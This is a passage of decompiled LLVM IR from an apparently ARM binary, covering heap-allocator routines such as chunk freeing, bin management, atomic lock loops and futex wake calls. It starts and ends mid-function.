  %v3_1368c = inttoptr i32 %v2_1368c to i32*
  store i32 %v0_1368c, i32* %v3_1368c, align 4
  %v0_13690 = load i32, i32* %r4.global-to-local, align 4
  %v1_13690 = load i32, i32* %sb.global-to-local, align 4
  %v2_13690 = add i32 %v1_13690, %v0_13690
  %v3_13690 = inttoptr i32 %v2_13690 to i32*
  %v4_13690 = load i32, i32* %v3_13690, align 4
  store i32 %v4_13690, i32* %r3.global-to-local, align 4
  %v0_13694 = load i32, i32* %fp.global-to-local, align 4
  %v1_13694 = add i32 %v0_13694, 8
  %v2_13694 = inttoptr i32 %v1_13694 to i32*
  %v3_13694 = load i32, i32* %v2_13694, align 4
  store i32 %v3_13694, i32* %r2.global-to-local, align 4
  %v2_13698 = icmp eq i32 %v4_13690, 0
  store i1 %v2_13698, i1* @cpsr_z, align 1
  %v0_1369c = load i32, i32* @r0, align 4
  %v2_1369c = add i32 %v3_13694, 12
  %v3_1369c = inttoptr i32 %v2_1369c to i32*
  store i32 %v0_1369c, i32* %v3_1369c, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  %v0_136a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_136a4 = load i32, i32* %sb.global-to-local, align 4
  %v2_136a4 = add i32 %v1_136a4, %v0_136a4
  store i32 %v2_136a4, i32* @r6, align 4
  br i1 %v2_13698, label %dec_label_pc_136e8, label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13670
  %v0_136ac = call i32 @function_15c98()
  store i32 %v0_136ac, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_136b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_136b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_136b4 = add i32 %v2_136b4, %v1_136b4
  %v4_136b4 = inttoptr i32 %v3_136b4 to i32*
  store i32 0, i32* %v4_136b4, align 4
  %v0_136b8 = call i32 @function_15c98()
  %v0_136bc = load i32, i32* @r5, align 4
  %v1_136bc = add i32 %v0_136bc, 12
  store i32 %v1_136bc, i32* %r3.global-to-local, align 4
  %v1_136c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c0 = add i32 %v1_136c0, %v1_136bc
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  %v4_136c0 = load i32, i32* %v3_136c0, align 4
  store i32 %v4_136c0, i32* %r2.global-to-local, align 4
  %v2_136c4 = icmp eq i32 %v4_136c0, 0
  br i1 %v2_136c4, label %dec_label_pc_136e8, label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136ac
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_136d0 = load i32, i32* @r6, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_136e0 = icmp eq i32 %v0_136d0, -38
  br i1 %v7_136e0, label %dec_label_pc_136f0, label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136cc, %dec_label_pc_136ac, %dec_label_pc_13670
  br label %dec_label_pc_135f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136cc
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_13704:                               ; preds = %dec_label_pc_13660
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13708 = load i32, i32* @r8, align 4
  %v1_13708 = sub i32 32, %v0_13708
  store i32 %v1_13708, i32* %r1.global-to-local, align 4
  %v7_13710 = lshr i32 1, %v1_13708
  store i32 %v7_13710, i32* %r4.global-to-local, align 4
  %v1_13714 = add i32 %v0_13708, -32
  %v6_13714 = icmp slt i32 %v1_13714, 0
  %v7_13714 = icmp eq i32 %v0_13708, 32
  store i1 %v7_13714, i1* @cpsr_z, align 1
  %v6_13718 = shl i32 1, %v0_13708
  store i32 %v6_13718, i32* %r3.global-to-local, align 4
  br i1 %v6_13714, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_13704
  %v7_1371c = shl i32 1, %v1_13714
  store i32 %v7_1371c, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_13704, %bb32
  %v0_13724 = phi i32 [ %v7_13710, %dec_label_pc_13704 ], [ %v7_1371c, %bb32 ]
  %v1_13720 = sub i32 -1, %v6_13718
  store i32 %v1_13720, i32* %r7.global-to-local, align 4
  %v1_13724 = sub i32 -1, %v0_13724
  store i32 %v1_13724, i32* @r8, align 4
  store i32 %v1_13720, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1372c

dec_label_pc_1372c:                               ; preds = %dec_label_pc_1372c.dec_label_pc_1372c_crit_edge, %bb33
  %v1_13734 = phi i32 [ %v1_13734.pre, %dec_label_pc_1372c.dec_label_pc_1372c_crit_edge ], [ %v1_13720, %bb33 ]
  %v2_1372c = load i32, i32* @global_var_223b8.560, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_13734 = and i32 %v2_1372c, %v1_13734
  store i32 %v2_13734, i32* %r1.global-to-local, align 4
  %v4_13738 = call i32 @function_15cec(i32 %v2_1372c, i32 %v2_13734, i32* nonnull @global_var_223b8.560)
  %v2_1373c = icmp eq i32 %v4_13738, 0
  store i1 %v2_1373c, i1* @cpsr_z, align 1
  br i1 %v2_1373c, label %dec_label_pc_13744, label %dec_label_pc_1372c.dec_label_pc_1372c_crit_edge

dec_label_pc_1372c.dec_label_pc_1372c_crit_edge:  ; preds = %dec_label_pc_1372c
  %v1_13734.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1372c

dec_label_pc_13744:                               ; preds = %dec_label_pc_1372c
  %v0_13748 = load i32, i32* @r8, align 4
  store i32 %v0_13748, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1374c

dec_label_pc_1374c:                               ; preds = %dec_label_pc_1374c.dec_label_pc_1374c_crit_edge, %dec_label_pc_13744
  %v1_13754 = phi i32 [ %v1_13754.pre, %dec_label_pc_1374c.dec_label_pc_1374c_crit_edge ], [ %v0_13748, %dec_label_pc_13744 ]
  %v2_1374c = load i32, i32* @global_var_223bc.562, align 4
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13754 = and i32 %v2_1374c, %v1_13754
  store i32 %v2_13754, i32* %r1.global-to-local, align 4
  %v4_13758 = call i32 @function_15cec(i32 %v2_1374c, i32 %v2_13754, i32* nonnull @global_var_223bc.562)
  %v2_1375c = icmp eq i32 %v4_13758, 0
  store i1 %v2_1375c, i1* @cpsr_z, align 1
  br i1 %v2_1375c, label %dec_label_pc_13764, label %dec_label_pc_1374c.dec_label_pc_1374c_crit_edge

dec_label_pc_1374c.dec_label_pc_1374c_crit_edge:  ; preds = %dec_label_pc_1374c
  %v1_13754.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1374c

dec_label_pc_13764:                               ; preds = %dec_label_pc_1374c
  %v0_13764 = load i32, i32* %fp.global-to-local, align 4
  %v1_13764 = add i32 %v0_13764, 4
  %v2_13764 = inttoptr i32 %v1_13764 to i32*
  %v3_13764 = load i32, i32* %v2_13764, align 4
  store i32 %v3_13764, i32* %r7.global-to-local, align 4
  %v1_13768 = add i32 %v0_13764, 12
  %v2_13768 = inttoptr i32 %v1_13768 to i32*
  %v3_13768 = load i32, i32* %v2_13768, align 4
  store i32 %v3_13768, i32* @r0, align 4
  %v1_1376c = add i32 %v0_13764, 8
  %v2_1376c = inttoptr i32 %v1_1376c to i32*
  %v3_1376c = load i32, i32* %v2_1376c, align 4
  store i32 %v3_1376c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13670

; uselistorder directives
  uselistorder i32 %v3_13764, { 1, 0 }
  uselistorder i32 %v0_13764, { 1, 2, 3, 0 }
  uselistorder i32 %v2_1374c, { 1, 0 }
  uselistorder i32 %v2_1372c, { 1, 0 }
  uselistorder i32 %v1_13720, { 2, 1, 0 }
  uselistorder i32 %v0_13670, { 1, 0 }
  uselistorder i32 %v3_13644, { 1, 2, 0 }
  uselistorder i32 %v0_13624, { 1, 0 }
  uselistorder i32 %v0_135e0, { 0, 2, 1 }
  uselistorder i32 %v0_13580, { 1, 0 }
  uselistorder i32 %v4_1356c, { 1, 0 }
  uselistorder i32 %v4_13560, { 1, 0 }
  uselistorder i32 %v3_13540, { 2, 1, 0 }
  uselistorder i32 %v0_13540, { 1, 0 }
  uselistorder i32 %v1_13510, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v3_1350c, { 1, 0 }
  uselistorder i32 %v3_134f4, { 1, 2, 0, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_13670, { 1, 0 }
  uselistorder label %dec_label_pc_1361c, { 1, 0 }
  uselistorder label %dec_label_pc_135e0, { 1, 0 }
  uselistorder label %dec_label_pc_135d8, { 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1355c, { 1, 0 }
  uselistorder label %dec_label_pc_13538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1350c, { 1, 0 }
}

define i32 @function_13780(i32 %arg1) local_unnamed_addr {
dec_label_pc_13780:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_13780 = load i32, i32* @r4, align 4
  %v6_13780 = load i32, i32* @r5, align 4
  %v9_13780 = load i32, i32* @r6, align 4
  %v12_13780 = load i32, i32* @r7, align 4
  %v15_13780 = load i32, i32* @r8, align 4
  %v18_13780 = load i32, i32* @sb, align 4
  %v21_13780 = load i32, i32* @sl, align 4
  %v24_13780 = load i32, i32* @fp, align 4
  %v0_13784 = load i32, i32* %r0.global-to-local, align 4
  %v2_13784 = icmp eq i32 %v0_13784, 0
  br i1 %v2_13784, label %dec_label_pc_13b44, label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %dec_label_pc_13780
  %v1_13790 = add i32 %v0_13784, -8
  store i32 %v1_13790, i32* @r8, align 4
  %v1_13794 = add i32 %v0_13784, -4
  %v2_13794 = inttoptr i32 %v1_13794 to i32*
  %v3_13794 = load i32, i32* %v2_13794, align 4
  store i32 %v3_13794, i32* %r1.global-to-local, align 4
  %v1_13798 = urem i32 %v3_13794, 2
  store i32 %v1_13798, i32* @r3, align 4
  %v2_13798 = icmp eq i32 %v1_13798, 0
  br i1 %v2_13798, label %dec_label_pc_13be0, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %dec_label_pc_13790
  %v1_137a0 = and i32 %v3_13794, -2
  store i32 %v1_137a0, i32* %r0.global-to-local, align 4
  %v2_137a4 = add i32 %v1_137a0, %v1_13790
  %v3_137a4 = inttoptr i32 %v2_137a4 to i32*
  %v4_137a4 = load i32, i32* %v3_137a4, align 4
  store i32 %v4_137a4, i32* %r3.global-to-local, align 4
  %v9_137a8 = icmp eq i32 %v3_13794, %v4_137a4
  br i1 %v9_137a8, label %.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_137a0
  store i32 0, i32* @r3, align 4
  call void @llvm.trap()
  unreachable

.preheader:                                       ; preds = %dec_label_pc_137a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_137a4, i32* @sb, align 4
  store i32 %v1_137a0, i32* @fp, align 4
  br label %bb62

.loopexit:                                        ; preds = %dec_label_pc_13968
  %v0_137d4.pre = load i32, i32* @r8, align 4
  br label %bb62

bb62:                                             ; preds = %.preheader, %.loopexit
  %v0_137d4 = phi i32 [ %v0_137d4.pre, %.loopexit ], [ %v1_13790, %.preheader ]
  %v0_137d0 = phi i32 [ %v0_137d0.pre, %.loopexit ], [ %v2_137a4, %.preheader ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.5, %.loopexit ], [ 0, %.preheader ]
  %v1_137d0 = add i32 %v0_137d0, 4
  %v2_137d0 = inttoptr i32 %v1_137d0 to i32*
  %v3_137d0 = load i32, i32* %v2_137d0, align 4
  store i32 %v3_137d0, i32* %r3.global-to-local, align 4
  %v1_137d4 = inttoptr i32 %v0_137d4 to i32*
  %v2_137d4 = load i32, i32* %v1_137d4, align 4
  store i32 %v2_137d4, i32* %r2.global-to-local, align 4
  %v2_137d8 = and i32 %v2_137d4, %v3_137d0
  store i32 %v2_137d8, i32* %r3.global-to-local, align 4
  %v1_137dc = urem i32 %v2_137d8, 2
  %v2_137dc = icmp eq i32 %v1_137dc, 0
  br i1 %v2_137dc, label %dec_label_pc_1391c.preheader, label %.dec_label_pc_137e4_crit_edge

.dec_label_pc_137e4_crit_edge:                    ; preds = %bb62
  %v0_137e4.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_137e4

dec_label_pc_137e4:                               ; preds = %dec_label_pc_139a4, %.dec_label_pc_137e4_crit_edge
  %v1_137f4 = phi i32 [ %v0_137d0, %.dec_label_pc_137e4_crit_edge ], [ %v2_139a4, %dec_label_pc_139a4 ]
  %v0_137f0 = phi i32 [ %v0_137e4.pre, %.dec_label_pc_137e4_crit_edge ], [ %v2_139a8, %dec_label_pc_139a4 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %.dec_label_pc_137e4_crit_edge ], [ %stack_var_-44.6, %dec_label_pc_139a4 ]
  %v3_137e4 = udiv i32 %v0_137f0, 16
  %v1_137e8 = add nsw i32 %v3_137e4, -1
  store i32 %v1_137e8, i32* @r0, align 4
  %v1_137f0 = or i32 %v0_137f0, 1
  store i32 %v1_137f0, i32* %r3.global-to-local, align 4
  %v2_137f4 = inttoptr i32 %v1_137f4 to i32*
  store i32 %v1_137f0, i32* %v2_137f4, align 4
  %v0_137f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_137f8 = load i32, i32* @r8, align 4
  %v2_137f8 = add i32 %v1_137f8, 4
  %v3_137f8 = inttoptr i32 %v2_137f8 to i32*
  store i32 %v0_137f8, i32* %v3_137f8, align 4
  %tmp = icmp ult i32 %v1_137e8, 33
  %v4_137fc = load i32, i32* @r0, align 4
  br i1 %tmp, label %.thread, label %dec_label_pc_13804

.thread:                                          ; preds = %dec_label_pc_137e4
  store i32 %v4_137fc, i32* @sl, align 4
  br label %dec_label_pc_1381c

dec_label_pc_13804:                               ; preds = %dec_label_pc_137e4
  %tmp80 = icmp ugt i32 %v4_137fc, 7168
  br i1 %tmp80, label %.thread45, label %dec_label_pc_13810

.thread45:                                        ; preds = %dec_label_pc_13804
  store i32 63, i32* @sl, align 4
  br label %dec_label_pc_1381c

dec_label_pc_13810:                               ; preds = %dec_label_pc_13804
  %v0_13810 = call i32 @function_17570()
  %v3_13814 = udiv i32 %v0_13810, 2097152
  store i32 %v3_13814, i32* %r0.global-to-local, align 4
  %v1_13818 = add nsw i32 %v3_13814, -496
  store i32 %v1_13818, i32* @sl, align 4
  br label %dec_label_pc_1381c

dec_label_pc_1381c:                               ; preds = %.thread45, %.thread, %dec_label_pc_13810
  %v0_13824 = phi i32 [ 63, %.thread45 ], [ %v4_137fc, %.thread ], [ %v1_13818, %dec_label_pc_13810 ]
  %v3_13820 = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_13820, i32* %r2.global-to-local, align 4
  %v3_13824 = mul i32 %v0_13824, 16
  store i32 %v3_13824, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r0.global-to-local, align 4
  %v1_1382c = or i32 %v3_13824, 8
  store i32 %v1_1382c, i32* %r3.global-to-local, align 4
  %v2_13830 = icmp eq i32 %v3_13820, 0
  store i1 %v2_13830, i1* @cpsr_z, align 1
  %v2_13834 = add i32 %v1_1382c, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v2_13834, i32* @r5, align 4
  br i1 %v2_13830, label %dec_label_pc_1383c, label %dec_label_pc_13b74

dec_label_pc_1383c.loopexit:                      ; preds = %dec_label_pc_13b9c
  %v0_13840.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1383c

dec_label_pc_1383c:                               ; preds = %dec_label_pc_1383c.loopexit, %dec_label_pc_1381c
  %v0_13840 = phi i32 [ %v0_13840.pre, %dec_label_pc_1383c.loopexit ], [ %v0_13824, %dec_label_pc_1381c ]
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v1_13840 = add i32 %v0_13840, 1
  store i32 %v1_13840, i32* %r1.global-to-local, align 4
  %v4_13844 = mul i32 %v1_13840, 16
  %v5_13844 = add i32 %v4_13844, ptrtoint (i32* @global_var_223b8.560 to i32)
  %v6_13844 = inttoptr i32 %v5_13844 to i32*
  %v7_13844 = load i32, i32* %v6_13844, align 4
  store i32 %v7_13844, i32* %r3.global-to-local, align 4
  %v2_13848 = icmp eq i32 %v7_13844, 0
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  br i1 %v2_13848, label %dec_label_pc_13c00, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_1383c, %dec_label_pc_13c00
  store i32 ptrtoint (i8** @global_var_22adc.527 to i32), i32* %r1.global-to-local, align 4
  %v3_1385c = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_1385c, i32* %r3.global-to-local, align 4
  %v2_13860 = icmp eq i32 %v3_1385c, 0
  store i1 %v2_13860, i1* @cpsr_z, align 1
  br i1 %v2_13860, label %dec_label_pc_13868, label %dec_label_pc_13ba0

dec_label_pc_13868:                               ; preds = %dec_label_pc_13bd0, %dec_label_pc_13858
  %v0_13868 = load i32, i32* @r8, align 4
  %v1_13868 = inttoptr i32 %v0_13868 to i32*
  %v2_13868 = load i32, i32* %v1_13868, align 4
  store i32 %v2_13868, i32* %r2.global-to-local, align 4
  %v0_1386c = load i32, i32* @sb, align 4
  %v1_1386c = add i32 %v0_1386c, 4
  %v2_1386c = inttoptr i32 %v1_1386c to i32*
  %v3_1386c = load i32, i32* %v2_1386c, align 4
  %v2_13870 = and i32 %v3_1386c, %v2_13868
  store i32 %v2_13870, i32* %r3.global-to-local, align 4
  %v1_13874 = urem i32 %v2_13870, 2
  store i32 %v1_13874, i32* %r2.global-to-local, align 4
  %v2_13874 = icmp eq i32 %v1_13874, 0
  br i1 %v2_13874, label %dec_label_pc_1387c, label %dec_label_pc_139c4

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13868
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r0, align 4
  %v3_13880 = load i32, i32* @global_var_227c0.568, align 4
  store i32 %v3_13880, i32* %r3.global-to-local, align 4
  %v2_13884 = icmp eq i32 %v3_13880, 0
  store i1 %v2_13884, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r4.global-to-local, align 4
  br i1 %v2_13884, label %dec_label_pc_138c8, label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %dec_label_pc_1387c
  %v0_13890 = call i32 @function_15c98()
  store i32 %v0_13890, i32* @r0, align 4
  %v0_13894 = load i32, i32* %r2.global-to-local, align 4
  %v2_13894 = add i32 %v0_13890, 1032
  %v3_13894 = inttoptr i32 %v2_13894 to i32*
  store i32 %v0_13894, i32* %v3_13894, align 4
  %v0_13898 = call i32 @function_15c98()
  store i32 %v0_13898, i32* @r0, align 4
  %v1_1389c = add i32 %v0_13898, 1036
  %v2_1389c = inttoptr i32 %v1_1389c to i32*
  %v3_1389c = load i32, i32* %v2_1389c, align 4
  store i32 %v3_1389c, i32* %r3.global-to-local, align 4
  %v2_138a0 = icmp eq i32 %v3_1389c, 0
  br i1 %v2_138a0, label %dec_label_pc_138c8, label %dec_label_pc_138a8

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13890
  %v1_138ac = add i32 %v0_13898, 1032
  store i32 %v1_138ac, i32* @r0, align 4
  store i32 240, i32* @r7, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_138c0 = icmp eq i32 %v0_13898, -1070
  br i1 %v7_138c0, label %dec_label_pc_13c1c, label %dec_label_pc_138c8

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138a8, %dec_label_pc_13890, %dec_label_pc_1387c, %dec_label_pc_13c1c
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  %v0_138cc = load i32, i32* @r6, align 4
  %v1_138cc = add i32 %v0_138cc, 8
  store i32 %v1_138cc, i32* %r2.global-to-local, align 4
  %v2_138d0 = add i32 %v0_138cc, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 8)
  %v3_138d0 = inttoptr i32 %v2_138d0 to i32*
  %v4_138d0 = load i32, i32* %v3_138d0, align 4
  store i32 %v4_138d0, i32* %r3.global-to-local, align 4
  %v2_138d4 = icmp eq i32 %v4_138d0, 0
  store i1 %v2_138d4, i1* @cpsr_z, align 1
  store i32 %v2_138d0, i32* @r4, align 4
  br i1 %v2_138d4, label %dec_label_pc_1391c.preheader, label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138c8
  %v0_138e0 = call i32 @function_15c98()
  store i32 %v0_138e0, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_138e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_138e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_138e8 = add i32 %v2_138e8, %v1_138e8
  %v4_138e8 = inttoptr i32 %v3_138e8 to i32*
  store i32 0, i32* %v4_138e8, align 4
  %v0_138ec = call i32 @function_15c98()
  store i32 %v0_138ec, i32* %r0.global-to-local, align 4
  %v0_138f0 = load i32, i32* @r6, align 4
  %v1_138f0 = add i32 %v0_138f0, 12
  store i32 %v1_138f0, i32* %r3.global-to-local, align 4
  %v1_138f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_138f4 = add i32 %v1_138f4, %v1_138f0
  %v3_138f4 = inttoptr i32 %v2_138f4 to i32*
  %v4_138f4 = load i32, i32* %v3_138f4, align 4
  store i32 %v4_138f4, i32* %r2.global-to-local, align 4
  %v2_138f8 = icmp eq i32 %v4_138f4, 0
  br i1 %v2_138f8, label %dec_label_pc_1391c.preheader, label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %dec_label_pc_138e0
  store i32 240, i32* @r7, align 4
  %v0_13904 = load i32, i32* @r4, align 4
  store i32 %v0_13904, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_13914 = icmp eq i32 %v0_13904, -38
  br i1 %v7_13914, label %dec_label_pc_13c30, label %dec_label_pc_1391c.preheader

dec_label_pc_1391c.preheader:                     ; preds = %dec_label_pc_13c30, %bb62, %dec_label_pc_138c8, %dec_label_pc_138e0, %dec_label_pc_13900
  %stack_var_-44.4.ph = phi i32 [ %stack_var_-44.3, %dec_label_pc_13900 ], [ %stack_var_-44.3, %dec_label_pc_13c30 ], [ %stack_var_-44.3, %dec_label_pc_138e0 ], [ %stack_var_-44.3, %dec_label_pc_138c8 ], [ %stack_var_-44.2, %bb62 ]
  %v0_1391c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %dec_label_pc_1391c.preheader, %dec_label_pc_139a4
  %v0_1391c = phi i32 [ %v0_139b0, %dec_label_pc_139a4 ], [ %v0_1391c.pre, %dec_label_pc_1391c.preheader ]
  %stack_var_-44.4 = phi i32 [ %stack_var_-44.6, %dec_label_pc_139a4 ], [ %stack_var_-44.4.ph, %dec_label_pc_1391c.preheader ]
  store i32 %v0_1391c, i32* %r0.global-to-local, align 4
  %v1_13920 = inttoptr i32 %v0_1391c to i32*
  %v2_13920 = call i32 @function_13260(i32* %v1_13920)
  store i32 %v2_13920, i32* %r0.global-to-local, align 4
  %v2_13924 = icmp eq i32 %v2_13920, 0
  br i1 %v2_13924, label %dec_label_pc_13968, label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %dec_label_pc_1391c
  %v0_1392c = load i32, i32* @r8, align 4
  %v1_1392c = inttoptr i32 %v0_1392c to i32*
  %v2_1392c = load i32, i32* %v1_1392c, align 4
  %v1_13930 = and i32 %v2_1392c, -2
  store i32 %v1_13930, i32* %r3.global-to-local, align 4
  %v2_13934 = sub i32 %v0_1392c, %v1_13930
  store i32 %v2_13934, i32* @r8, align 4
  %v1_13938 = add i32 %v2_13934, 4
  %v2_13938 = inttoptr i32 %v1_13938 to i32*
  %v3_13938 = load i32, i32* %v2_13938, align 4
  store i32 %v1_137a0, i32* %r0.global-to-local, align 4
  %v1_13940 = and i32 %v3_13938, -2
  store i32 %v1_13940, i32* %r2.global-to-local, align 4
  %v2_13944 = add i32 %v1_13940, %v1_137a0
  store i32 %v2_13944, i32* %r3.global-to-local, align 4
  %v0_1394c = load i32, i32* @fp, align 4
  %v2_1394c = add i32 %v0_1394c, %v1_13940
  store i32 %v2_1394c, i32* @fp, align 4
  %tmp81 = icmp ult i32 %v2_13944, 163841
  br i1 %tmp81, label %dec_label_pc_13968, label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_1392c
  %v2_13954 = xor i32 %v2_13944, %v1_13940
  store i32 %v2_13954, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.4, i32* %r1.global-to-local, align 4
  %v3_1395c = icmp ult i32 %v1_13940, %v2_13954
  br i1 %v3_1395c, label %bb63, label %dec_label_pc_13968

bb63:                                             ; preds = %dec_label_pc_13954
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_13954, %bb63, %dec_label_pc_1392c, %dec_label_pc_1391c
  %stack_var_-44.5 = phi i32 [ %stack_var_-44.4, %dec_label_pc_1391c ], [ %stack_var_-44.4, %dec_label_pc_1392c ], [ %stack_var_-44.4, %dec_label_pc_13954 ], [ 1, %bb63 ]
  %v0_13968 = load i32, i32* @sb, align 4
  store i32 %v0_13968, i32* %r0.global-to-local, align 4
  %v1_1396c = call i32 @function_134f0(i32 %v0_13968)
  store i32 %v1_1396c, i32* %r0.global-to-local, align 4
  %v2_13970 = icmp eq i32 %v1_1396c, 0
  %v0_137d0.pre = load i32, i32* @sb, align 4
  br i1 %v2_13970, label %.loopexit, label %dec_label_pc_13978

dec_label_pc_13978:                               ; preds = %dec_label_pc_13968
  %v1_13978 = add i32 %v0_137d0.pre, 4
  %v2_13978 = inttoptr i32 %v1_13978 to i32*
  %v3_13978 = load i32, i32* %v2_13978, align 4
  store i32 %v1_137a0, i32* %r0.global-to-local, align 4
  %v1_13980 = and i32 %v3_13978, -2
  store i32 %v1_13980, i32* %r2.global-to-local, align 4
  %v2_13984 = add i32 %v1_13980, %v1_137a0
  store i32 %v2_13984, i32* %r3.global-to-local, align 4
  %tmp82 = icmp ult i32 %v2_13984, 163841
  br i1 %tmp82, label %dec_label_pc_139a4, label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_13978
  %v2_13990 = xor i32 %v2_13984, %v1_13980
  store i32 %v2_13990, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.5, i32* %r1.global-to-local, align 4
  %v3_13998 = icmp ult i32 %v1_13980, %v2_13990
  br i1 %v3_13998, label %bb64, label %dec_label_pc_139a4

bb64:                                             ; preds = %dec_label_pc_13990
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %dec_label_pc_13990, %bb64, %dec_label_pc_13978
  %stack_var_-44.6 = phi i32 [ %stack_var_-44.5, %dec_label_pc_13978 ], [ %stack_var_-44.5, %dec_label_pc_13990 ], [ 1, %bb64 ]
  %v2_139a4 = add i32 %v1_13980, %v0_137d0.pre
  store i32 %v2_139a4, i32* @sb, align 4
  %v0_139a8 = load i32, i32* @fp, align 4
  %v2_139a8 = add i32 %v0_139a8, %v1_13980
  store i32 %v2_139a8, i32* @fp, align 4
  %v1_139ac = add i32 %v2_139a4, 4
  %v2_139ac = inttoptr i32 %v1_139ac to i32*
  %v3_139ac = load i32, i32* %v2_139ac, align 4
  store i32 %v3_139ac, i32* %r3.global-to-local, align 4
  %v0_139b0 = load i32, i32* @r8, align 4
  %v1_139b0 = inttoptr i32 %v0_139b0 to i32*
  %v2_139b0 = load i32, i32* %v1_139b0, align 4
  store i32 %v2_139b0, i32* %r2.global-to-local, align 4
  %v2_139b4 = and i32 %v2_139b0, %v3_139ac
  store i32 %v2_139b4, i32* %r3.global-to-local, align 4
  %v1_139b8 = urem i32 %v2_139b4, 2
  %v2_139b8 = icmp eq i32 %v1_139b8, 0
  br i1 %v2_139b8, label %dec_label_pc_1391c, label %dec_label_pc_137e4

dec_label_pc_139c4:                               ; preds = %dec_label_pc_13868
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_139c8 = load i32, i32* @global_var_223b8.560, align 4
  %v5_139c8 = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v5_139c8, i32* %r4.global-to-local, align 4
  %v1_139cc = load i32, i32* @sl, align 4
  %v6_139cc = lshr i32 %v2_139c8, %v1_139cc
  %v1_139d0 = sub i32 32, %v1_139cc
